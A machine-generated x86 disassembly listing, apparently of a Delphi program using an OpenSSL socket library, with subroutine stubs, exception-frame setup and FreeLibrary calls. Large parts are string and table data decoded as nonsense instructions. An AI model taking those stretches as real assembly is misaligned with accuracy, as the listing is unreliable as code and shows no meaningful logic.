cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov bl 0x1
sub_45e678
cmp [ rw-data ] 0x0
jle r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_45e6fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45e728
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e72f
retn
call sub_45e678
sub_45e73c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45e761
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e768
retn
sub_45e774
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45e799
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e7a0
retn
sub_45e8c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45e8ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e8f4
retn
sub_45e900
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45e925
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e92c
retn
sub_45e938
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45e95d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e964
retn
sub_45e970
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45e995
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e99c
retn
sub_45e9a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45e9cd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e9d4
retn
sub_45ea06
push ebx
dec esp
jbe r-xdata
add ecx [ edx ]
push esp
dec ecx
push ebx
or dh [ ebx + 0x73 ]
insb
jbe r-xdata
or dh [ fs : ebx + 0x73 ]
insb
push ebx
dec esp
jbe r-xdata
outsb
jb r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] bh
xor ecx [ ecx ]
jae r-xdata
or al 0x49
push ebx
push ebx
dec esp
dec edi
jo r-xdata
jae r-xdata
outsb
insb
jbe r-xdata
push ebx
dec esp
nop
clc
0x13060045 0x4954
push ebx
push ebx
dec esp
xchg esp eax
0x10030045 0x4954
outsb
push ebx
insb
insd
inc edx
outsd
je r-xdata
je r-xdata
push ebx
dec esp
jbe r-xdata
dec esp
dec edi
jo r-xdata
or [ ebx + 0x73 ] dh
jae r-xdata
0x730e0045 0x6c73
or [ ebx + 0x73 ] esi
insb
jbe r-xdata
push eax
popad
outsb
or al 0x49
insb
insd
push ebx
jb r-xdata
jb r-xdata
dec esp
push ebx
jbe r-xdata
add [ eax + eax ] ah
add [ eax ] al
mov [ esi ] dl
ja r-xdata
push ebp
outsb
popad
jae r-xdata
or al 0x49
push ebx
push ebx
dec esp
dec edi
jo r-xdata
jb r-xdata
imul ebp [ edi + 0x6e ] 0x45ec4473
add [ edi ] al
or eax 0x53644954
push ebx
dec esp
dec edi
jo r-xdata
in al dx
jb r-xdata
jb r-xdata
imul esp [ edi + 0x6e ] 0x730a6465
jae r-xdata
dec ecx
push ebx
dec esp
dec ebp
outsd
outsb
push ebx
push ebx
dec esp
mov eax eax
cmp al 0xea
inc ebp
add [ ebx ] al
or dl [ ecx + ecx * 2 + 0x64 ]
push ebx
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x65560a00
jb r-xdata
inc esi
imul ebp [ ebp + 0x4 ] 0xc00406d
add [ eax ] al
dec [ eax + eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4b070002 ] al
imul ebp [ edi + 0x6e ] 0x45ebf473
add ah bh
push ss
inc ecx
add [ ecx ] cl
add [ ecx + ecx * 2 ] cl
push ebx
push ebx
dec esp
dec edi
jo r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
push ebx
je r-xdata
jb r-xdata
adc [ ebx + 0x73 ] dh
je r-xdata
insd
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x73730a74
or [ eax ] al
or al [ ebx + 0x69 ]
jo r-xdata
jns r-xdata
add [ eax ] bl
imul ebp [ ebp - 0x20 ] 0x100045e9
add [ eax ] al
call [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d060003 ] al
je r-xdata
pop es
add [ eax ] al
add [ edx ] 0x0
outsb
push ebx
push ebx
dec esp
or [ eax ] eax
add al 0x6d
inc eax
add [ eax + eax ] al
add bh bh
add al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
or al 0x52
outsd
outsd
je r-xdata
inc ecx
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
imul ebp [ esi + 0x67 ] 0x40109400
add [ ebx + ebp * 8 + 0x45 ] ch
add [ eax ] cl
adc [ esi + edx * 2 + 0x65 ] dl
jb r-xdata
add [ eax ] al
add [ eax ] al
inc ebp
jbe r-xdata
outsb
inc bx
insb
imul esp [ ebp + 0x6e ] 0x636e4f74
push ebx
push ebx
or al 0x49
jae r-xdata
adc [ eax ] al
or al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
sbb al 0x0
jb r-xdata
jae r-xdata
outsd
cmp al 0x10
inc eax
add [ eax + eax ] dl
add bh bh
adc al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ ebx ] cl
push esi
jb r-xdata
jo r-xdata
outsd
cmp dl ch
inc ebp
add [ ecx ] dl
add [ eax ] al
call [ ecx ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d040004 ] al
dec ebx
add [ edi ] al
jb r-xdata
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
cmp [ ebx ] dh
inc eax
add [ ebx + esi ] bh
jns r-xdata
add [ eax ] al
in al dx
inc ebp
add [ esp + ebp * 8 + 0x45 ] al
add [ eax ] al
add [ eax ] al
je r-xdata
outsb
jae r-xdata
add [ ecx ] eax
or [ eax + 0x61 ] dl
insb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x11 ] bh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 8 + 0x45 ] bl
js r-xdata
inc eax
add [ ebx + eax ] al
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ 0xffffffff94000000 ] al
adc [ eax ] al
or [ eax ] al
add [ eax ] al
xchg esp eax
imul esi [ ebx + 0x74 ] 0xfc00408d
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560a0005 ] al
jb r-xdata
adc [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] al
mov al [ 0x28004010 ]
push r-xdata
sbb al 0x0
add bh bh
sbb al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ edx ] cl
push esi
jb r-xdata
outsd
hlt
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
add al 0x4d
inc esi
imul ebp [ ebp + 0x4 ] 0x800406d
add [ eax ] al
dec [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43080001 ] al
jb r-xdata
add [ eax ] al
xor ch ah
jb r-xdata
loopne r-xdata
inc ebp
add [ eax ] dl
inc ecx
inc ecx
add [ eax + 0x41 ] dl
add [ eax + eax * 2 ] ch
inc ecx
add [ ecx ] ch
inc ecx
add [ ebx + edx * 8 ] cl
inc ebp
add [ ecx ] bh
inc ecx
add [ edx ] dh
add [ eax + eax - 0x347c0000 ] dh
inc ebp
add [ esp + 0x41 ] cl
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
xor [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
out dx eax
inc ebp
mov dh ch
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x180045ee ] cl
add [ eax ] al
add [ eax + 0x28004010 ] ah
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
xor [ ecx ] cl
inc esi
add [ esp + edx * 2 ] cl
dec ecx
push ebx
push ebx
dec esp
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc ebx
imul esi [ eax + 0x68 ] 0x694c7265
jae r-xdata
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
add al 0x3
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dh
jbe r-xdata
add eax 0x53530a00
dec esp
dec edi
jo r-xdata
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
or eax 0x53644954
push ebx
dec esp
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax + edx + 0x200040 ] dl
inc eax
add ah ah
out dx al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
and [ eax ] al
add [ eax + eax ] bl
in eax dx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
in eax dx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
cld
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ch
out dx al
inc ebp
add [ eax ] bh
add [ eax ] al
add [ eax + 0x28004010 ] ah
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
imul esi [ edx + 0x73 ] r-xdata
xor [ eax ] al
add [ eax + 0x41 ] al
add [ eax + 0x180045fb ] bh
inc ecx
xor eax [ eax ]
xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
outsb
je r-xdata
jns r-xdata
imul ebp [ edi + 0x6e ] 0x45eb1473
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
inc ecx
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ esi + edi * 8 - 0x4d1bffbb ] cl
inc ebp
add [ ebx + esi * 4 ] bl
inc ebp
add [ ebx + esi * 4 + 0x45 ] cl
add [ eax ] bh
add [ esi ] al
sar bh 0x45
add [ edi + edi * 8 ] ch
inc ebp
add [ eax + edx * 8 - 0x17ffbb ] ch
inc ebp
add [ ecx + edx * 8 ] ch
inc ebp
add al dh
inc [ ebp ]
or [ eax ] al
inc esi
add [ edx + eax ] ch
inc esi
add [ ecx + eax + 0x46 ] dl
add [ eax - 0x33ffb9ff ] dh
add [ esi ] eax
and [ eax ] al
inc esi
add [ eax + eax ] ch
inc esi
add al dh
add [ esi ] eax
adc eax 0x53644954
push ebx
dec esp
dec ecx
dec edi
sar [ eax - 0x11 ] 0x45
or [ ebx ] cl
inc ebx
jb r-xdata
add [ eax ] ecx
or eax [ ebx + 0x65 ]
jb r-xdata
adc [ ecx + 0x41 ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
je r-xdata
outsb
push ebx
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ edi + ecx * 2 ] cl
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc ecx
add [ eax + eax * 2 ] ch
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ 0x4000000 ] al
insd
inc eax
add [ eax + eax ] al
add [ eax ] al
add al 0x6d
inc eax
add [ eax ] cl
add [ eax ] al
add [ ebp * 2 + 0xc0040 ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
sbb al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
and [ eax ] al
add [ eax ] al
or eax 0x53644954
push ebx
dec esp
dec edi
jo r-xdata
imul esp [ esi + 0x69 ] 0x65746163
pop es
push esp
dec ecx
pop eax
xor eax 0x42073930
outsd
outsd
insb
popad
outsb
add [ eax ] dl
inc eax
add [ eax ] al
and dl dh
inc ebp
add [ ebx + 0x45ebf4c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0004 ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0006 ] al
dec [ eax + 0x1ff0000 ]
nop
loopne r-xdata
jae r-xdata
js r-xdata
out dx al
inc ebp
add [ eax - 0x34 ] al
inc ebp
add [ ecx ] cl
add [ ecx + ecx * 2 ] cl
push ebx
push ebx
dec esp
dec edi
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530a0003 ] al
dec edi
dec eax
popad
outsb
insb
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
inc ebp
add [ eax - 0x54000000 ] dl
out 0x45 eax
add [ esp + 0x41 ] cl
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
jb r-xdata
outsb
outsw
cmp al 0xeb
inc ebp
add [ eax - 0x6f010000 ] dl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
popad
outsb
insb
jb r-xdata
add [ edi ] al
adc eax 0x53644954
push ebx
dec esp
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
inc ebp
add [ eax ] 0x0
add [ eax + 0x4f0d0007 ] al
outsb
inc edi
je r-xdata
outsb
push ebx
push ebx
dec esp
add al 0x0
inc eax
in al dx
inc ebp
add [ eax + eax ] bh
sbb dl dh
inc ebp
jae r-xdata
jns r-xdata
imul ebp [ edi + 0x6e ] 0x45eb1473
add [ eax ] bh
add bh bh
js r-xdata
push ebx
dec esp
dec edi
jo r-xdata
push ebx
push ebx
dec esp
mov eax eax
cld
add [ eax + 0x41 ] dl
add [ eax + eax * 2 ] ch
inc ecx
add [ ecx ] ch
inc ecx
add al bh
lahf
inc ecx
add [ ecx ] bh
inc eax
inc ebp
add [ eax ] dl
inc ecx
inc ecx
inc ecx
add [ edx ] dh
inc ecx
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ eax ] dh
cld
inc ebp
add ah ah
mov dl 0x45
add [ ebx + esi * 4 ] bl
inc ebp
add [ ebx + esi * 4 + 0x45 ] cl
add [ eax + 0x700045fc ] bh
std
inc ebp
add al bh
std
inc ebp
add [ esi + edi * 8 + 0x45 ] cl
add [ eax - 0x2 ] ch
inc ebp
add [ 0x53644954 ] dl
jb r-xdata
popad
jae r-xdata
jb r-xdata
outsb
outsw
cmp al 0xeb
inc ebp
add [ eax - 0x7f010000 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0005 ] al
outsb
inc edi
je r-xdata
test [ esi ] cl
inc esi
add [ edi ] al
push esp
jb r-xdata
outsb
push ebx
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
or al 0x4f
add [ eax - 0x4 ] bh
ja r-xdata
xor eax 0xf2143930
inc ebp
add ah dh
adc [ eax ] al
add [ eax ] al
or al 0x49
push ebx
push ebx
dec esp
dec edi
jo r-xdata
add [ eax ] dl
add [ eax ] al
add [ eax + 0x28004010 ] ah
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
inc ebp
popad
jae r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
inc ebp
add [ eax + eax ] cl
add [ eax ] al
adc [ ebx + 0x45 ] ch
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0xf463321
inc ebp
dec ecx
dec edi
jo r-xdata
outsb
push ebx
push ebx
dec esp
add [ eax ] al
mov eax eax
xchg esp eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 8 + 0x80045 ] dl
add [ eax ] al
mov al [ 0x28004010 ]
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
push eax
cmovbe eax [ eax ]
or al 0x54
dec ecx
push ebx
push ebx
dec esp
inc ebx
imul esi [ eax + 0x68 ] 0x408d7265
add al dh
adc al 0xf2
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
xor [ eax ] al
js r-xdata
jb r-xdata
dec ecx
pop eax
xor eax 0xf2243930
inc ebp
add [ edi ] al
pop es
push esp
dec ecx
pop eax
add ah cl
push cs
inc esi
add [ esi + ecx + 0x54070046 ] al
ja r-xdata
jb r-xdata
outsb
push ebx
push ebx
dec esp
inc ebp
jb r-xdata
xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
push 0x980045eb
add [ eax ] al
[ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0008 ] al
outsb
push esi
xor [ eax ] al
int3
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb ah dh
inc ebp
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
inc ebp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
inc ebp
add [ eax + eax ] cl
outsd
jb r-xdata
xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
push 0x880045eb
add [ eax ] al
dec [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0006 ] al
outsb
push esi
dec edi
push ebx
push ebx
dec esp
inc edi
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 8 + 0x45 ] cl
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
inc ebp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x1346337d
add [ eax ] al
add bl dh
inc ebp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x1d4633dd
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ebx
outsd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 8 + 0xc0045 ] ch
outsd
je r-xdata
dec esi
dec esi
outsd
je r-xdata
inc ebp
dec ecx
dec edi
jo r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x1b46350d
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ebx
jb r-xdata
je r-xdata
jne r-xdata
sar [ eax - 0xc ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] bh
inc ebp
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
inc ebp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x154634a9
inc ebp
dec ecx
outsb
push ebx
push ebx
dec esp
dec esp
outsd
popad
inc ebp
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x11463449
inc ebp
outsd
popad
push ebx
push ebx
dec esp
dec esp
imul esp [ edx + 0x72 ] 0x8b797261
rcr [ eax ] 0xf4
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
hlt
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x746f6f52
inc ebx
popad
je r-xdata
je r-xdata
outsd
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
push edx
outsd
outsd
outsb
inc ebx
outsd
outsb
je r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
cmc
inc ebp
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
test [ ebp ] 0xc
add [ eax ] al
add [ edx + esi * 8 + 0x33280045 ] ah
inc eax
add [ ebx + esi ] dh
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
outsd
jb r-xdata
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x16463641
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
dec esp
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc dh dh
inc ebp
add [ eax + eax ] cl
add [ eax ] al
add bl dh
inc ebp
outsd
jb r-xdata
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x174635dd
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x74726543
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 8 + 0xc0045 ] ch
inc ebp
jb r-xdata
dec ecx
dec edi
push ebx
push ebx
dec esp
dec ebp
outsd
dec esi
rcr ah 0xf4
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
hlt
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc edx
imul ebp [ esi + 0x64 ] 0x45676e69
jb r-xdata
inc ebp
jb r-xdata
imul ebp [ esi + 0x67 ] 0x74726543
je r-xdata
add [ eax + eax ] cl
add [ eax ] al
add bl dh
inc ebp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 8 + 0x45 ] al
cmc
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add bl dh
inc ebp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
